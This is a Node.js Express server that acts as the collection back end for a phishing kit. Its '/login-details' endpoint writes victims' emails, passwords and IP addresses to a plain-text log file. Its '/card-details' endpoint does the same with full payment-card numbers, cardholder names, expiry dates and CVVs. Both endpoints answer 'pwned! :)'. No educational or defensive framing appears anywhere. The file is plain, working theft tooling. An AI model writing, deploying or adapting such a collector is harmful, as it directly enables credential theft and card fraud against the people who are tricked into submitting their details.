const express = require("express");
const rateLimit = require("express-rate-limit");
const fs = require("fs");
const app = express();
const port = process.env.PORT || 8080;

const limiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  limit: 5,
  standardHeaders: "draft-8",
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers.
});

app.use(express.json());
app.use(errorHandler);

app.post("/login-details", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Incorrect parameters." });
  }

  fs.appendFileSync(
    "logs/login-details-log.txt",
    `${new Date().toLocaleString("en-US")}\n\n` +
      `IP: ${req.ip}\nEmail: ${email}\nPassword: ${password}\n\n`
  );
  res.status(200).json({ successMessage: "pwned! :)" });
});

app.post("/card-details", (req, res) => {
  const { cardNum, nameOnCard, expirationDate, cvv } = req.body;

  if (!cardNum || !nameOnCard || !expirationDate || !cvv) {
    return res.status(400).json({ error: "Incorrect parameters." });
  }

  fs.appendFileSync(
    "logs/card-details-log.txt",
    `${new Date().toLocaleString("en-US")}\n\n` +
      `IP: ${req.ip}\nCard Number: ${cardNum}\nName on card: ${nameOnCard}\nExpiration date (M/Y): ${expirationDate}\nSecurity code: ${cvv}\n\n`
  );
  res.status(200).json({ successMessage: "pwned! :)" });
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});

function errorHandler(err, req, res, next) {
  console.error(err.stack);
  res.status(500).json({ error: "Internal Server Error" });
}
